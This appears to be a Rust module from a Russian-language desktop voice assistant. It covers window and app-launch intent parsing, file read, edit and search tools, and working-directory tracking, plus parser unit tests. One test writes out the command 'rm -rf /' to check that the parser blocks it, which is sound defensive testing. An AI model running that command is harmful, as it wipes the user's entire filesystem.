    let list_hint = has(&["список", "перечисли", "какие", "каких"])
        || (has(&["покажи", "показать"]) && target.is_none());
    let close_verb = has(&[
        "закрой",
        "закройте",
        "закрыть",
        "закрывай",
        "спрячь",
        "скрой",
        "убери",
    ]);
    // «Закрой приложение X» — это выход приложения, не закрытие окна.
    if close_verb && window_marker.is_none() {
        return None;
    }

    let action = if list_hint {
        "list"
    } else if close_verb {
        "close"
    } else if joined.contains("полный экран")
        || joined.contains("полном экране")
        || joined.contains("фулскрин")
        || joined.contains("на весь экран")
        || joined.contains("во весь экран")
    {
        "fullscreen"
    } else if has(&[
        "сверни",
        "сверните",
        "свернуть",
        "минимизируй",
        "минимизировать",
    ]) {
        "minimize"
    } else if has(&[
        "разверни",
        "разверните",
        "развернуть",
        "максимизируй",
        "максимизировать",
        "растяни",
    ]) {
        "maximize"
    } else if has(&["восстанови", "восстановить", "верни", "верните", "вернуть"])
    {
        "restore"
    } else if focus_verb {
        "focus"
    } else if has(&["покажи", "показать"]) && target.is_some() {
        "focus"
    } else {
        return None;
    };

    // «Приложение» без имени — не гадаем (решает planner/LLM). Для «окна»
    // без имени сохраняется прежний смысл: окно самого Джарвиса.
    if app_marker.is_some() && window_marker.is_none() && target.is_none() && action != "list" {
        return None;
    }

    let app = if action == "list" {
        None
    } else {
        match target {
            Some(name) if crate::platform::is_self_window_target(&name) => None,
            other => other,
        }
    };
    Some((action.to_string(), app))
}

/// Публичная обёртка управления окном для быстрого пути (llm::ask).
pub fn window_control(action: &str, app: Option<&str>) -> String {
    crate::platform::window_control(action, app)
}

/// Публичная обёртка для быстрого пути запуска (llm::ask).
pub fn open_app_by_name(name: &str) -> ToolOutcome {
    open_app_impl(name)
}

/// Быстрый путь «открой X»: после триггера остаётся имя, которое разрешается
/// в установленное приложение? Тогда открываем сразу, без лотереи tool-вызовов
/// модели (2B умудрялся открыть App Store вместо слайсера).
/// None — пусть решает LLM.
pub fn try_open_app_from_prompt(prompt: &str) -> Option<String> {
    let words: Vec<&str> = prompt.split_whitespace().collect();
    let triggers = [
        "открой",
        "открыть",
        "запусти",
        "запустить",
        "включи",
        "включить",
        "open",
        "launch",
    ];
    let first = words.first()?.to_lowercase();
    if !triggers.contains(&first.as_str()) {
        return None;
    }
    let fillers = ["приложение", "программу", "app"];
    let mut rest: Vec<&str> = words[1..].to_vec();
    if rest.is_empty() {
        return None;
    }
    if fillers.contains(&rest[0].to_lowercase().as_str()) {
        rest.remove(0);
    }
    // Таймеры/будильники — это инструменты, а не приложения; цифры выдают
    // «запусти таймер на 5 минут». Такие просьбы идут мимо быстрого пути.
    if rest.is_empty()
        || rest.iter().any(|w| {
            w.chars().any(|c| c.is_ascii_digit()) || w.contains("таймер") || w.contains("будильник")
        })
    {
        return None;
    }
    let rest = rest.join(" ");
    let resolved = crate::platform::app_resolve(&rest);
    // app_resolve возвращает вход без изменений, если ничего не нашёл.
    if resolved.eq_ignore_ascii_case(&rest) {
        return None;
    }
    Some(resolved)
}

// =========================================================================
// Утилиты
// =========================================================================

pub fn expand_path(path: &str) -> String {
    if path.starts_with("~/") || path == "~" {
        let home = home_dir();
        if let Some(h) = home {
            if path == "~" {
                return h;
            }
            let rest = &path[2..];
            return format!("{h}/{rest}");
        }
    }
    path.to_string()
}

/// Рабочая директория ассистента.
///
/// Раньше её не было: `file_read` и `shell` смотрели в каталог запуска
/// процесса, поэтому «прочитай README» из приложения не находил ничего, а
/// цепочку `cd проект && ls` нельзя было собрать. Теперь директория одна на
/// весь агентный цикл: `cd` в shell её меняет, а относительные пути всех
/// файловых инструментов считаются от неё.
fn cwd_cell() -> &'static std::sync::Mutex<Option<std::path::PathBuf>> {
    static CWD: std::sync::OnceLock<std::sync::Mutex<Option<std::path::PathBuf>>> =
        std::sync::OnceLock::new();
    CWD.get_or_init(|| std::sync::Mutex::new(None))
}

/// Текущая рабочая директория. По умолчанию — корень данных Джарвиса.
pub fn cwd() -> String {
    let guard = cwd_cell().lock().unwrap_or_else(|e| e.into_inner());
    match guard.as_ref() {
        Some(p) => p.to_string_lossy().to_string(),
        None => paths::base_dir().to_string_lossy().to_string(),
    }
}

/// Задать рабочую директорию. Пустая строка или несуществующий путь — сброс
/// на корень данных. Возвращает то, что реально применилось.
pub fn set_cwd(path: &str) -> String {
    let candidate = expand_path(path.trim());
    let resolved = if candidate.is_empty() {
        None
    } else {
        let p = std::path::PathBuf::from(&candidate);
        p.is_dir().then(|| p.canonicalize().unwrap_or(p))
    };
    let mut guard = cwd_cell().lock().unwrap_or_else(|e| e.into_inner());
    *guard = resolved;
    drop(guard);
    cwd()
}

/// Путь относительно рабочей директории: то, что видит модель в выводе
/// инструментов. Абсолютные пути остаются как есть.
fn display_path(path: &std::path::Path) -> String {
    let root = std::path::PathBuf::from(cwd());
    match path.strip_prefix(&root) {
        Ok(rel) if !rel.as_os_str().is_empty() => rel.to_string_lossy().to_string(),
        _ => path.to_string_lossy().to_string(),
    }
}

/// Превращает путь из аргументов инструмента в абсолютный: `~` — домашний
/// каталог, относительный — от рабочей директории.
pub fn resolve_path(path: &str) -> String {
    resolve_path_from(path, &cwd())
}

/// То же, но с явной базой: без глобального состояния, поэтому проверяемо в
/// тестах и переиспользуемо.
pub fn resolve_path_from(path: &str, base: &str) -> String {
    let expanded = expand_path(path.trim());
    let p = std::path::Path::new(&expanded);
    if p.is_absolute() {
        return expanded;
    }
    std::path::PathBuf::from(base)
        .join(p)
        .to_string_lossy()
        .to_string()
}

/// Достаёт конечную цель `cd` из команды оболочки: «ли команда меняет
/// директорию и на какую». Понимает `cd foo`, `cd "с пробелами"`, `cd ~/x`,
/// `cd A && ls`, `cd A; cd B`. `cd` без аргумента и `cd -` игнорируются.
fn parse_cd_target(cmd: &str) -> Option<String> {
    let mut target: Option<String> = None;
    for part in cmd.split(['&', ';', '|', '\n']) {
        let part = part.trim();
        let rest = match part
            .strip_prefix("cd ")
            .or_else(|| part.strip_prefix("cd\t"))
        {
            Some(r) => r.trim(),
            None => continue,
        };
        // Берём только до следующего слова-разделителя: `cd dir arg` не бывает.
        let raw = match rest.chars().next() {
            Some(q @ ('"' | '\'')) => {
                let tail = &rest[q.len_utf8()..];
                tail.split(q).next().unwrap_or("").to_string()
            }
            _ => rest.split_whitespace().next().unwrap_or("").to_string(),
        };
        let raw = raw.trim();
        if raw.is_empty() || raw == "-" || raw.starts_with('$') {
            continue;
        }
        let resolved = resolve_path(raw);
        if std::path::Path::new(&resolved).is_dir() {
            target = Some(resolved);
        }
    }
    target
}

/// Сколько строк файла максимум отдаём модели.
const READ_LINE_LIMIT: usize = 400;
/// Сколько символов в одной строке вывода.
const LINE_CHAR_LIMIT: usize = 300;
/// Потолок совпадений в поиске и по маске.
const FIND_LIMIT: usize = 200;
/// Каталоги, которые не обходим: мусор, кэши, чужие зависимости.
const SKIP_DIRS: &[&str] = &[
    ".git",
    ".hg",
    ".svn",
    "node_modules",
    "target",
    "dist",
    "build",
    ".venv",
    "venv",
    "__pycache__",
    ".next",
    ".cache",
    "Library",
    ".Trash",
];

fn should_skip_dir(name: &str) -> bool {
    SKIP_DIRS.contains(&name)
}

fn ellipsize(line: &str) -> String {
    let trimmed = line.trim_end();
    if trimmed.chars().count() <= LINE_CHAR_LIMIT {
        return trimmed.to_string();
    }
    let cut: String = trimmed.chars().take(LINE_CHAR_LIMIT).collect();
    format!("{cut}…")
}

/// Отдаёт строки файла с номерами — так модель может сослаться на место,
/// которое собирается править через `file_edit`.
pub fn read_lines(content: &str, offset: Option<usize>, limit: Option<usize>) -> String {
    let lines: Vec<&str> = content.lines().collect();
    if lines.is_empty() {
        return "Файл пустой".to_string();
    }
    let start = offset.unwrap_or(1).max(1).min(lines.len());
    let count = limit.unwrap_or(READ_LINE_LIMIT).clamp(1, READ_LINE_LIMIT);
    let end = (start - 1 + count).min(lines.len());
    let width = end.to_string().len();
    let mut out = String::new();
    for (i, line) in lines[start - 1..end].iter().enumerate() {
        let num = start + i;
        out.push_str(&format!("{num:>width$}| {}\n", ellipsize(line)));
    }
    if end < lines.len() {
        out.push_str(&format!(
            "…всего {} строк, показаны {start}–{end}. Продолжи с offset={}",
            lines.len(),
            end + 1
        ));
    }
    out.trim_end().to_string()
}

/// Заменяет фрагмент в тексте и сообщает, сколько замен сделано. `old` обязан
/// встречаться: иначе модель правила файл по памяти, а не по факту, и
/// молчаливая «успешная» правка недопустима.
pub fn apply_edit(
    content: &str,
    old: &str,
    new: &str,
    all: bool,
) -> Result<(String, usize), String> {
    if old.is_empty() {
        return Err("пустой фрагмент для замены".into());
    }
    let count = content.matches(old).count();
    if count == 0 {
        return Err(format!(
            "Фрагмент не найден: {}. Прочитай файл и возьми текст оттуда.",
            short_err(old, 80)
        ));
    }
    if count > 1 && !all {
        return Err(format!(
            "Фрагмент встречается {count} раз — уточни его или поставь all=true"
        ));
    }
    Ok(if all {
        (content.replace(old, new), count)
    } else {
        (content.replacen(old, new, 1), 1)
    })
}

/// Дописывает текст в конец файла, добавляя перевод строки при необходимости.
fn append_to_file(path: &str, content: &str) -> std::io::Result<()> {
    use std::io::Write;
    let mut file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)?;
    let needs_newline = std::fs::read_to_string(path)
        .map(|existing| !existing.is_empty() && !existing.ends_with('\n'))
        .unwrap_or(false);
    if needs_newline {
        file.write_all(b"\n")?;
    }
    file.write_all(content.as_bytes())?;
    if !content.ends_with('\n') {
        file.write_all(b"\n")?;
    }
    Ok(())
}

/// Содержимое каталога с типами и размерами: одни имена ничего не говорят
/// модели о том, что перед ней.
fn list_dir(path: &str) -> std::io::Result<String> {
    let root = std::path::Path::new(path);
    let mut entries: Vec<(bool, u64, String)> = Vec::new();
    for entry in std::fs::read_dir(root)? {
        let entry = entry?;
        let name = entry.file_name().to_string_lossy().to_string();
        if name.starts_with('.') {
            continue;
        }
        let meta = entry.metadata().ok();
        let is_dir = meta.as_ref().is_some_and(|m| m.is_dir());
        let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
        entries.push((is_dir, size, name));
    }
    if entries.is_empty() {
        return Ok("Пусто".to_string());
    }
    // Каталоги вперёд, дальше по имени — предсказуемый порядок.
    entries.sort_by(|a, b| b.0.cmp(&a.0).then_with(|| a.2.cmp(&b.2)));
    let total = entries.len();
    let list: Vec<String> = entries
        .iter()
        .take(FIND_LIMIT)
        .map(|(is_dir, size, name)| {
            if *is_dir {
                format!("{name}/")
            } else {
                format!("{name} ({} б)", size)
            }
        })
        .collect();
    let mut out = list.join("\n");
    if total > FIND_LIMIT {
        out.push_str(&format!("\n…всего {total} записей"));
    }
    Ok(out)
}

/// Обходит дерево и собирает только текстовые файлы разумного размера.
fn walk_files<F>(root: &std::path::Path, mut visit: F) -> std::io::Result<()>
where
    F: FnMut(&std::path::Path) -> bool,
{
    fn recurse<F>(dir: &std::path::Path, depth: usize, visit: &mut F) -> std::io::Result<()>
    where
        F: FnMut(&std::path::Path) -> bool,
    {
        if depth > 12 {
            return Ok(());
        }
        let entries = match std::fs::read_dir(dir) {
            Ok(e) => e,
            Err(_) => return Ok(()),
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with('.') {
                continue;
            }
            let Ok(meta) = entry.metadata() else { continue };
            if meta.is_dir() {
                if should_skip_dir(&name) {
                    continue;
                }
                recurse(&path, depth + 1, visit)?;
            } else if !visit(&path) {
                return Ok(());
            }
        }
        Ok(())
    }
    recurse(root, 0, &mut visit)
}

/// Поиск подстроки в файле или дереве. Возвращает готовый отчёт для модели с
/// номерами строк: без них правка найденного места — угадывание.
pub fn search_in_path(root: &str, query: &str, context: usize) -> std::io::Result<String> {
    if query.trim().is_empty() {
        return Ok(String::new());
    }
    let root_path = std::path::Path::new(root);
    let mut out = String::new();
    let mut hits = 0usize;

    let mut scan = |file: &std::path::Path| -> bool {
        let Ok(meta) = std::fs::metadata(file) else {
            return true;
        };
        if meta.len() > 2 * 1024 * 1024 {
            return true;
        }
        let Ok(content) = std::fs::read_to_string(file) else {
            return true;
        };
        let lines: Vec<&str> = content.lines().collect();
        let mut reported: Vec<usize> = Vec::new();
        for (i, line) in lines.iter().enumerate() {
            if !line.contains(query) {
                continue;
            }
            let file_label = display_path(file);
            if reported.is_empty() && !out.is_empty() {
                out.push('\n');
            }
            let from = i.saturating_sub(context);
            let to = (i + context + 1).min(lines.len());
            for (j, ctx_line) in lines[from..to].iter().enumerate() {
                let num = from + j + 1;
                if num == i + 1 && !reported.contains(&num) {
                    out.push_str(&format!("{}:{num}: {}\n", file_label, ellipsize(ctx_line)));
                } else if num != i + 1 {
                    out.push_str(&format!("{}:{num}-  {}\n", file_label, ellipsize(ctx_line)));
                }
            }
            if !reported.contains(&(i + 1)) {
                reported.push(i + 1);
            }
            hits += 1;
            if hits >= FIND_LIMIT {
                out.push_str(&format!("…остановился на {FIND_LIMIT} совпадениях\n"));
                return false;
            }
        }
        true
    };

    if root_path.is_file() {
        scan(root_path);
    } else {
        walk_files(root_path, &mut scan)?;
    }
    Ok(out.trim_end().to_string())
}

/// Простое сопоставление маски имени: `*`, `?` и `**` как «любая глубина».
fn glob_match(pattern: &str, name: &str) -> bool {
    fn inner(p: &[u8], n: &[u8]) -> bool {
        match p.split_first() {
            None => n.is_empty(),
            Some((b'*', rest)) => {
                // `**` схлопываем: для имён файлов этого достаточно.
                let rest = if rest.first() == Some(&b'*') {
                    &rest[1..]
                } else {
                    rest
                };
                if !rest.contains(&b'*') && !rest.contains(&b'?') {
                    // Хвост без своих звёздочек: он должен быть суффиксом.
                    // Иначе «*.rs» ошибочно матчил бы «main.rss».
                    return n.ends_with(rest);
                }
                (0..=n.len()).any(|skip| inner(rest, &n[skip..]))
            }
            Some((b'?', rest)) => !n.is_empty() && inner(rest, &n[1..]),
            Some((c, rest)) => n.first() == Some(c) && inner(rest, &n[1..]),
        }
    }
    inner(pattern.as_bytes(), name.as_bytes())
}

/// Поиск файлов по маске имени.
pub fn glob_in_path(root: &str, pattern: &str) -> std::io::Result<String> {
    let root_path = std::path::Path::new(root);
    let mut names: Vec<String> = Vec::new();
    if root_path.is_file() {
        names.push(display_path(root_path));
    } else {
        walk_files(root_path, &mut |file: &std::path::Path| {
            let name = file
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_default();
            let rel = display_path(file);
            // Сначала как есть. Если ничего не нашли — второй проход без учёта
            // регистра: пользователь говорит «найди readme», а файл README.
            if glob_match(pattern, &name) || glob_match(pattern, &rel) {
                names.push(rel);
            }
            names.len() < FIND_LIMIT
        })?;
        if names.is_empty() {
            let lower = pattern.to_lowercase();
            walk_files(root_path, &mut |file: &std::path::Path| {
                let name = file
                    .file_name()
                    .map(|n| n.to_string_lossy().to_lowercase())
                    .unwrap_or_default();
                let rel = display_path(file).to_lowercase();
                if glob_match(&lower, &name) || glob_match(&lower, &rel) {
                    names.push(display_path(file));
                }
                names.len() < FIND_LIMIT
            })?;
        }
    }
    names.sort();
    Ok(names.join("\n"))
}

fn home_dir() -> Option<String> {
    std::env::var("HOME").ok()
}

pub(crate) fn temp_path(filename: &str) -> String {
    let dir = std::env::temp_dir();
    dir.join(filename).to_string_lossy().to_string()
}

pub fn humanize_seconds(s: u64) -> String {
    if s < 60 {
        format!("{} {}", s, plural(s, "секунду", "секунды", "секунд"))
    } else if s < 3600 {
        let m = s / 60;
        let rem = s % 60;
        if rem == 0 {
            format!("{} {}", m, plural(m, "минуту", "минуты", "минут"))
        } else {
            format!(
                "{} {} {} {}",
                m,
                plural(m, "минуту", "минуты", "минут"),
                rem,
                plural(rem, "секунду", "секунды", "секунд")
            )
        }
    } else {
        let h = s / 3600;
        let m = (s % 3600) / 60;
        if m == 0 {
            format!("{} {}", h, plural(h, "час", "часа", "часов"))
        } else {
            format!(
                "{} {} {} {}",
                h,
                plural(h, "час", "часа", "часов"),
                m,
                plural(m, "минуту", "минуты", "минут")
            )
        }
    }
}

fn plural(n: u64, one: &'static str, few: &'static str, many: &'static str) -> &'static str {
    if n % 10 == 1 && n % 100 != 11 {
        one
    } else if (2..=4).contains(&(n % 10)) && !(11..=14).contains(&(n % 100)) {
        few
    } else {
        many
    }
}

#[cfg(test)]
mod tests {
    // ---------- Контракты парсера: молчаливые дефолты запрещены ----------

    /// task_done без id — раньше молча брал id=1 и закрывал ЧУЖУЮ задачу.
    #[test]
    fn task_done_without_id_is_rejected() {
        match parse(r#"<tool>{"name":"task_done"}</tool>"#) {
            ToolParse::Failed(reason) => assert!(reason.contains("id"), "{reason}"),
            other => panic!("ожидал Failed, получено {other:?}"),
        }
    }

    #[test]
    fn task_remove_without_id_is_rejected() {
        match parse(r#"<tool>{"name":"task_remove"}</tool>"#) {
            ToolParse::Failed(reason) => assert!(reason.contains("id"), "{reason}"),
            other => panic!("ожидал Failed, получено {other:?}"),
        }
    }

    /// file_edit без `new` — раньше молча удалял фрагмент.
    #[test]
    fn file_edit_without_new_is_rejected() {
        match parse(r#"<tool>{"name":"file_edit","args":{"path":"a.txt","old":"x"}}</tool>"#) {
            ToolParse::Failed(reason) => assert!(reason.contains("new"), "{reason}"),
            other => panic!("ожидал Failed, получено {other:?}"),
        }
    }

    /// Явный new:"" (удаление фрагмента) — валиден.
    #[test]
    fn file_edit_with_empty_new_is_allowed() {
        assert!(matches!(
            parse(r#"<tool>{"name":"file_edit","args":{"path":"a.txt","old":"x","new":""}}</tool>"#),
            ToolParse::Call(ToolCall::FileEdit { new, .. }) if new.is_empty()
        ));
    }

    /// Неизвестный инструмент — Failed, не Call.
    #[test]
    fn unknown_tool_is_rejected() {
        assert!(matches!(
            parse(r#"<tool>{"name":"delete_everything"}</tool>"#),
            ToolParse::Failed(_)
        ));
    }

    // ---------- Verification Engine: постусловия файловых операций ----------

    fn exec_for_test(call: ToolCall) -> ToolOutcome {
        let (tx, _rx) = std::sync::mpsc::channel::<AudioMessage>();
        let (etx, _erx) = std::sync::mpsc::channel::<crate::events::JarvisEvent>();
        execute(call, &tx, &etx)
    }

    /// file_write: перечитывание после записи — успешный сценарий.
    #[test]
    fn file_write_verifies_content() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("write_test.txt");
        let outcome = exec_for_test(ToolCall::FileWrite {
            path: path.to_string_lossy().to_string(),
            content: "hello".into(),
        });
        assert!(outcome.ok, "{}", outcome.speech);
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "hello");
    }

    /// file_append: дописанное оказывается в конце файла.
    #[test]
    fn file_append_verifies_tail() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("append_test.txt");
        std::fs::write(&path, "first").unwrap();
        let outcome = exec_for_test(ToolCall::FileAppend {
            path: path.to_string_lossy().to_string(),
            content: "second".into(),
        });
        assert!(outcome.ok, "{}", outcome.speech);
        // append_to_file нормализует переносы: дописанное идёт с новой строки.
        let actual = std::fs::read_to_string(&path).unwrap();
        assert!(actual.starts_with("first"), "{actual}");
        assert!(actual.trim_end().ends_with("second"), "{actual}");
    }

    /// file_edit: старый фрагмент обязан исчезнуть.
    #[test]
    fn file_edit_verifies_replacement() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("edit_test.txt");
        std::fs::write(&path, "one two three").unwrap();
        let outcome = exec_for_test(ToolCall::FileEdit {
            path: path.to_string_lossy().to_string(),
            old: "two".into(),
            new: "два".into(),
            all: false,
        });
        assert!(outcome.ok, "{}", outcome.speech);
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "one два three");
    }

    use super::*;

    #[test]
    fn strip_tool_blocks_cleans_answer() {
        assert_eq!(
            strip_tool_blocks("Привет. <tool>{\"name\":\"ИМЯ\",\"args\":{}}</tool>"),
            "Привет."
        );
        assert_eq!(strip_tool_blocks("<tool>{\"name\":\"ЯЗЫК_РАСТ\"}"), "");
        assert_eq!(strip_tool_blocks("Ответ </tool"), "Ответ");
        assert_eq!(strip_tool_blocks("Просто ответ."), "Просто ответ.");
    }

    #[test]
    fn parse_bare_native_call() {
        match parse_bare(r#"web_search {"query":"сдек шоп"}"#) {
            ToolParse::Call(ToolCall::WebSearch { query }) => assert_eq!(query, "сдек шоп"),
            other => panic!("unexpected: {other:?}"),
        }
        match parse_bare(r#"open_path {"path":"/Users/x"}"#) {
            ToolParse::Call(ToolCall::OpenPath { path }) => assert_eq!(path, "/Users/x"),
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn parse_bare_ignores_prose() {
        assert!(matches!(parse_bare("Ищу в интернете"), ToolParse::None));
        assert!(matches!(parse_bare("Открыл папку."), ToolParse::None));
        // Вызов с хвостовым текстом — не чистый вызов.
        assert!(matches!(
            parse_bare(r#"web_search {"query":"x"} — нашёл"#),
            ToolParse::None
        ));
        // Неизвестное имя инструмента не принимаем.
        assert!(matches!(
            parse_bare(r#"frobnicate {"x":1}"#),
            ToolParse::None
        ));
    }

    fn call(text: &str) -> Option<ToolCall> {
        match parse(text) {
            ToolParse::Call(c) => Some(c),
            ToolParse::None => None,
            ToolParse::Failed(reason) => panic!("ожидался успешный разбор, получено: {reason}"),
        }
    }

    #[test]
    fn parse_open_app() {
        let text = r#"<tool>{"name":"open_app","args":{"name":"Zed"}}</tool>"#;
        match call(text) {
            Some(ToolCall::OpenApp { name }) => assert_eq!(name, "Zed"),
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn parse_desktop_keyboard_and_mouse_actions() {
        assert!(matches!(
            parse(r#"<tool>{"name":"desktop_input","args":{"action":"type_text","text":"Привет"}}</tool>"#),
            ToolParse::Call(ToolCall::DesktopInput { action: crate::platform::desktop::DesktopAction::TypeText { text } }) if text == "Привет"
        ));
        assert!(matches!(
            parse(r#"<tool>{"name":"hotkey","args":{"keys":["CTRL","S"]}}</tool>"#),
            ToolParse::Call(ToolCall::DesktopInput { action: crate::platform::desktop::DesktopAction::Hotkey { keys } }) if keys == vec![String::from("CTRL"), String::from("S")]
        ));
        assert!(matches!(
            parse(r#"<tool>{"name":"click","args":{"x":420,"y":300}}</tool>"#),
            ToolParse::Call(ToolCall::DesktopInput { action: crate::platform::desktop::DesktopAction::Click { x: 420, y: 300, .. } })
        ));
    }

    #[test]
    fn parse_wait_between_desktop_steps() {
        assert!(matches!(
            parse(r#"<tool>{"name":"wait","args":{"seconds":2}}</tool>"#),
            ToolParse::Call(ToolCall::Wait { seconds: 2 })
        ));
        assert!(matches!(
            parse(r#"<tool>{"name":"wait","args":{"seconds":31}}</tool>"#),
            ToolParse::Failed(_)
        ));
    }

    #[test]
    fn parse_shell_blocks_dangerous() {
        let text = r#"<tool>{"name":"shell","args":{"cmd":"rm -rf /"}}</tool>"#;
        assert!(matches!(parse(text), ToolParse::Failed(_)));
    }

    #[test]
    fn parse_shell_normal() {
        let text = r#"<tool>{"name":"shell","args":{"cmd":"ls ~/Downloads"}}</tool>"#;
        assert!(matches!(call(text), Some(ToolCall::Shell { .. })));
    }

    #[test]
    fn parse_timer() {
        let text = r#"<tool>{"name":"set_timer","args":{"seconds":300,"label":"чай"}}</tool>"#;
        match call(text) {
            Some(ToolCall::SetTimer { seconds, label }) => {
                assert_eq!(seconds, 300);
                assert_eq!(label.as_deref(), Some("чай"));
            }
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn parse_ignores_plain_text() {
        assert!(matches!(parse("Привет! Как дела?"), ToolParse::None));
    }

    #[test]
    fn parse_run_command() {
        let text = r#"<tool>{"name":"run_command","args":{"name":"youtube"}}</tool>"#;
        match call(text) {
            Some(ToolCall::RunCommand { name, args }) => {
                assert_eq!(name, "youtube");
                assert!(args.is_empty());
            }
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn parse_run_command_with_params() {
        let text = r#"<tool>{"name":"run_command","args":{"name":"музыка","args":{"query":"лунная соната","volume":30}}}</tool>"#;
        match call(text) {
            Some(ToolCall::RunCommand { name, args }) => {
                assert_eq!(name, "музыка");
                assert_eq!(args.get("query").map(String::as_str), Some("лунная соната"));
                // Числа приводятся к строке — они подставляются в {плейсхолдеры}.
                assert_eq!(args.get("volume").map(String::as_str), Some("30"));
            }
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn fast_app_path_skips_tool_requests() {
        // «сафари» разрешается в приложение — но только там, где оно есть.
        #[cfg(target_os = "macos")]
        assert_eq!(
            try_open_app_from_prompt("открой сафари").as_deref(),
            Some("Safari")
        );
        // Таймер с цифрами — это set_timer, а не приложение.
        assert_eq!(try_open_app_from_prompt("запусти таймер на 5 минут"), None);
        // «Открой сайт …» — не про приложения.
        assert_eq!(try_open_app_from_prompt("открой сайт apple.com"), None);
    }

    #[test]
    fn parse_window_actions() {
        // Модель пишет по-разному: «разверни», «на весь экран», «свернуть».
        for (raw, want) in [
            ("развернуть", "maximize"),
            ("на весь экран", "maximize"),
            ("на полный экран", "fullscreen"),
            ("свернуть", "minimize"),
            ("закрыть", "close"),
            ("восстановить", "restore"),
            ("показать окна", "list"),
            ("на передний план", "focus"),
        ] {
            let text = format!(r#"<tool>{{"name":"window","args":{{"action":"{raw}"}}}}</tool>"#);
            match call(&text) {
                Some(ToolCall::Window { action, .. }) => assert_eq!(action, want, "вход: {raw}"),
                other => panic!("unexpected: {other:?}"),
            }
        }
    }

    #[test]
    fn parse_window_with_app() {
        let text =
            r#"<tool>{"name":"окно","args":{"action":"развернуть","app":"терминал"}}</tool>"#;
        match call(text) {
            Some(ToolCall::Window { action, app }) => {
                assert_eq!(action, "maximize");
                assert_eq!(app.as_deref(), Some("терминал"));
            }
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn parse_window_no_app_means_active() {
        let text = r#"<tool>{"name":"window","args":{"action":"свернуть"}}</tool>"#;
        match call(text) {
            Some(ToolCall::Window { action, app }) => {
                assert_eq!(action, "minimize");
                assert!(app.is_none());
            }
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn parse_native_app_tools() {
        match call(r#"<tool>{"name":"send_message","args":{"to":"Мама","text":"привет"}}</tool>"#)
        {
            Some(ToolCall::SendMessage { to, text }) => {
                assert_eq!(to, "Мама");
                assert_eq!(text, "привет");
            }
            other => panic!("unexpected: {other:?}"),
        }
        match call(r#"<tool>{"name":"add_note","args":{"title":"покупки","body":"молоко"}}</tool>"#)
        {
            Some(ToolCall::AddNote { title, body }) => {
                assert_eq!(title, "покупки");
                assert_eq!(body, "молоко");
            }
            other => panic!("unexpected: {other:?}"),
        }
        match call(
            r#"<tool>{"name":"create_event","args":{"title":"созвон","time":"15:30"}}</tool>"#,
        ) {
            Some(ToolCall::CreateEvent { title, date, time }) => {
                assert_eq!(title, "созвон");
                assert!(date.is_empty());
                assert_eq!(time, "15:30");
            }
            other => panic!("unexpected: {other:?}"),
        }
        match call(r#"<tool>{"name":"музыка","args":{"action":"Пауза"}}</tool>"#) {
            Some(ToolCall::MusicControl { action }) => assert_eq!(action, "pause"),
            other => panic!("unexpected: {other:?}"),
        }
        // «Останови» — не то же самое, что «пауза»: трек уходит в начало.
        for (raw, expected) in [
            ("Останови", "stop"),
            ("стоп", "stop"),
            ("выключи музыку", "stop"),
            ("продолжи", "play"),
            ("дальше", "next"),
        ] {
            match call(&format!(
                r#"<tool>{{"name":"music_control","args":{{"action":"{raw}"}}}}</tool>"#
            )) {
                Some(ToolCall::MusicControl { action }) => {
                    assert_eq!(action, expected, "действие «{raw}»")
                }
                other => panic!("unexpected для «{raw}»: {other:?}"),
            }
        }
        // Обрывок JSON при ранней остановке чинится в parse_lenient.
        match parse_lenient(
            r#"<tool>{"name":"send_message","args":{"to":"+79001234567","text":"готово""#,
        ) {
            ToolParse::Call(ToolCall::SendMessage { to, .. }) => {
                assert_eq!(to, "+79001234567")
            }
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn parse_short_alias_open_url() {
        // Реальный случай: модель написала "open" вместо "open_url".
        let text = r#"<tool>{"name":"open","args":{"url":"https://www.google.com"}}</tool>"#;
        match call(text) {
            Some(ToolCall::OpenUrl { url, .. }) => assert_eq!(url, "https://www.google.com"),
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn parse_generic_name_by_args() {
        assert!(matches!(
            call(r#"<tool>{"name":"open","args":{"name":"Safari"}}</tool>"#),
            Some(ToolCall::OpenApp { .. })
        ));
        assert!(matches!(
            call(r#"<tool>{"name":"open","args":{"path":"~/Downloads"}}</tool>"#),
            Some(ToolCall::OpenPath { .. })
        ));
        assert!(matches!(
            call(r#"<tool>{"name":"run","args":{"cmd":"date"}}</tool>"#),
            Some(ToolCall::Shell { .. })
        ));
    }

    #[test]
    fn parse_name_normalization() {
        assert!(matches!(
            call(r#"<tool>{"name":"open-url","args":{"url":"https://ya.ru"}}</tool>"#),
            Some(ToolCall::OpenUrl { .. })
        ));
        assert!(matches!(
            call(r#"<tool>{"name":" СКРИНШОТ ","args":{}}</tool>"#),
            Some(ToolCall::Screenshot)
        ));
    }

    #[test]
    fn parse_flat_args() {
        let text = r#"<tool>{"name":"open_url","url":"https://ya.ru"}</tool>"#;
        match call(text) {
            Some(ToolCall::OpenUrl { url, .. }) => assert_eq!(url, "https://ya.ru"),
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn parse_args_as_json_string() {
        let text = r#"<tool>{"name":"open_url","args":"{\"url\":\"https://ya.ru\"}"}</tool>"#;
        match call(text) {
            Some(ToolCall::OpenUrl { url, .. }) => assert_eq!(url, "https://ya.ru"),
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn parse_numeric_string_and_minutes() {
        assert!(matches!(
            call(r#"<tool>{"name":"set_volume","args":{"percent":"40"}}</tool>"#),
            Some(ToolCall::SetVolume { percent: 40 })
        ));
